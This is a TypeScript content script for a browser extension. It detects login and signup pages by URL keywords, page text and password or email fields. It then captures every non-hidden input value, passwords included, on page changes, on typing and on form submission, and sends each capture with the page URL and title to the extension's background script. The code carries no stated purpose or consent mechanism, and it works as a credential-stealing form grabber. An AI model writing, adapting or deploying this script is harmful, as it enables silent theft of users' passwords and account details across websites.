
// This script will be injected into web pages to collect form data

// Function to determine if a page is a login or signup page
const isAuthPage = (): boolean => {
  const url = window.location.href.toLowerCase();
  const pageText = document.body.innerText.toLowerCase();
  const pageHTML = document.body.innerHTML.toLowerCase();
  
  // Check URL for common auth-related paths
  const urlKeywords = ['login', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'auth'];
  const hasUrlKeyword = urlKeywords.some(keyword => url.includes(keyword));
  
  // Check page content for common auth-related text
  const contentKeywords = ['login', 'sign in', 'signup', 'sign up', 'register', 'create account', 'password'];
  const hasContentKeyword = contentKeywords.some(keyword => pageText.includes(keyword));
  
  // Check for form elements that are commonly used in auth forms
  const hasPasswordInput = document.querySelector('input[type="password"]') !== null;
  const hasEmailInput = document.querySelector('input[type="email"]') !== null;
  
  return hasUrlKeyword || (hasContentKeyword && (hasPasswordInput || hasEmailInput));
};

// Function to collect form data from the page
const collectFormData = (): any[] => {
  const formData: any[] = [];
  const forms = document.querySelectorAll('form');
  
  forms.forEach((form, formIndex) => {
    const inputs = form.querySelectorAll('input:not([type="hidden"])');
    const formInputs: any[] = [];
    
    inputs.forEach((input: HTMLInputElement) => {
      const type = input.type;
      const name = input.name || input.id || `input-${formIndex}-${type}`;
      const value = input.value;
      const isAutoFill = input.matches(':-webkit-autofill') || 
                         input.hasAttribute('autocomplete');
      
      // Only collect if the input has a value
      if (value) {
        formInputs.push({
          type,
          name,
          value,
          isAutoFill
        });
      }
    });
    
    if (formInputs.length > 0) {
      formData.push({
        formIndex,
        action: form.action,
        inputs: formInputs
      });
    }
  });
  
  return formData;
};

// Function to send collected data to the extension background script
const sendDataToExtension = (data: any) => {
  chrome.runtime.sendMessage({
    type: 'FORM_DATA',
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    data: data
  });
};

// Initialize observer to detect form input changes
const initFormObserver = () => {
  // Watch for changes in the DOM
  const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
      if (mutation.type === 'childList' || mutation.type === 'attributes') {
        // Only check for forms if this might be an auth page
        if (isAuthPage()) {
          const formData = collectFormData();
          if (formData.length > 0) {
            sendDataToExtension(formData);
          }
        }
      }
    });
  });
  
  // Start observing the document
  observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['value']
  });
  
  // Also add listeners for form submissions
  document.addEventListener('submit', (event) => {
    if (isAuthPage()) {
      const formData = collectFormData();
      if (formData.length > 0) {
        sendDataToExtension(formData);
      }
    }
  });
  
  // Listen for input events to capture dynamically filled inputs
  document.addEventListener('input', (event) => {
    if (isAuthPage() && event.target instanceof HTMLInputElement) {
      // Debounce to prevent too many messages
      clearTimeout((window as any).inputTimeout);
      (window as any).inputTimeout = setTimeout(() => {
        const formData = collectFormData();
        if (formData.length > 0) {
          sendDataToExtension(formData);
        }
      }, 500);
    }
  });
};

// Check if this is an auth page and if so, initialize the observer
if (isAuthPage()) {
  // Give the page a moment to fully load
  setTimeout(initFormObserver, 1000);
}
